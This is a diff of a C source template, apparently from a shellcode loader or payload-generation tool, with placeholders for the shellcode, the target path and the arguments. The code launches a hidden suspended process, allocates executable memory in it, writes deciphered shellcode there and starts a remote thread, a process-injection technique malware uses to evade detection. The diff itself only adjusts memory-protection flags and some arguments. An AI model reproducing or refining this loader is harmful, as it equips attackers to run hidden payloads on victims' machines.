@@ -17,12 +17,11 @@ char* cipher(char* data, long dataLen) {
 
 int main(int argc, char** argv) {
 	Sleep(startDelay * 1000);
-
+	
 	PROCESS_INFORMATION p_info;
 	STARTUPINFO s_info = {sizeof(s_info)};
 	LPVOID apointer = NULL;
 	SIZE_T size = #SHELLCODELENGTH;
-	SIZE_T bytes = 0;
 	HANDLE hThread;
 	TCHAR injectpath[MAX_PATH*2];
 	TCHAR args[MAX_PATH*2];
@@ -33,9 +32,7 @@ int main(int argc, char** argv) {
 	sprintf(args, cipher("#FORMAT2", #FORMAT2LENGTH), injectpath, #ARGS);
 	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
 	NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	NtWriteVirtualMemory(p_info.hProcess, apointer, cipher("#SHELLCODE", #SHELLCODELENGTH), #SHELLCODELENGTH, &bytes);
-	NtProtectVirtualMemory(p_info.hProcess, &apointer, &bytes, PAGE_EXECUTE, NULL);
-	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, apointer, FALSE, 0, 0, 0, NULL);
-	NtClose(p_info.hProcess);
-	NtClose(p_info.hThread);
+	NtWriteVirtualMemory(p_info.hProcess, apointer, cipher("#SHELLCODE", #SHELLCODELENGTH), #SHELLCODELENGTH, NULL);
+	NtProtectVirtualMemory(p_info.hProcess, &apointer, &size, PAGE_EXECUTE_READ, NULL);
+	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, NULL, FALSE, 0, 0, 0, NULL);
 }
